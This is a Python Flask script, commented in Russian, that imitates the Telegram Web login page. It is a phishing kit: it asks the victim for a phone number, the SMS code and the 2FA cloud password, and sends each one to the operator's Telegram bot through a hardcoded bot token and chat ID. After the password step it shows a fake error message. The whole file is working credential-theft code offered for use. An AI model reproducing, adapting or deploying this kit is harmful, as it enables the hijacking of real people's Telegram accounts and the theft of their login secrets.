from flask import Flask, request, redirect, url_for, render_template_string
import requests
import os

app = Flask(__name__)

# --- НАСТРОЙКИ ТЕЛЕГРАМ БОТА ---
BOT_TOKEN = "9264156701:AAFS9etlfwo0SFR-fafjyeqlhF-bpF7qEEw"  # Замени!
CHAT_ID = "6467020677"             # Замени!
PROXY = ""  # Если используешь прокси (например, "http://127.0.0.1:8080"), вставь сюда. Если VPN системный — оставь пустым.

def send_to_tg(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    
    proxies = {
        "http": PROXY,
        "https": PROXY
    } if PROXY else None

    try:
        # Отправляем запрос (через прокси, если он указан)
        response = requests.post(url, json=payload, proxies=proxies, timeout=10)
        print("Лог отправлен:", response.text)
    except Exception as e:
        print("Ошибка отправки:", e)

STYLE = """
<style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e6ebee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 320px; text-align: center; }
    h2 { color: #222; font-size: 22px; margin-bottom: 20px; }
    input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dfe1e5; border-radius: 8px; outline: none; font-size: 15px; }
    button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
    .error { color: #e53935; font-size: 14px; margin-top: 15px; }
</style>
"""

@app.route('/')
def index():
    return render_template_string(f"""
    <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
        <div class="login-box">
            <h2>Вход в Telegram</h2>
            <form action="/login" method="post">
                <input type="text" name="phone" placeholder="Номер телефона" required><br>
                <input type="text" name="code" placeholder="Код из СМС" required><br>
                <button type="submit">Далее</button>
            </form>
        </div>
    </body></html>
    """)

@app.route('/login', methods=['POST'])
def login():
    phone = request.form.get('phone')
    code = request.form.get('code')
    
    # Отправляем в ТГ
    send_to_tg(f"🚨 [НОВЫЙ ЛОГ]\n📱 Телефон: {phone}\n🔑 Код: {code}")
    
    return redirect(url_for('twofa', phone=phone))

@app.route('/2fa')
def twofa():
    phone = request.args.get('phone', '')
    return render_template_string(f"""
    <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
        <div class="login-box">
            <h2>Облачный пароль</h2>
            <p style="font-size:14px; color:#666;">Введите пароль 2FA</p>
            <form action="/2fa_submit" method="post">
                <input type="hidden" name="phone" value="{phone}">
                <input type="password" name="password" placeholder="Пароль" required><br>
                <button type="submit">Войти</button>
            </form>
        </div>
    </body></html>
    """)

@app.route('/2fa_submit', methods=['POST'])
def twofa_submit():
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    # Отправляем в ТГ
    send_to_tg(f"🚨 [НОВЫЙ ЛОГ - 2FA]\n📱 Телефон: {phone}\n🔒 Пароль: {password}")
    
    return render_template_string(f"""
    <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
        <div class="login-box">
            <h2>Вход в Telegram</h2>
            <div class="error">Неверный пароль! Попробуйте снова.</div>
        </div>
    </body></html>
    """)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
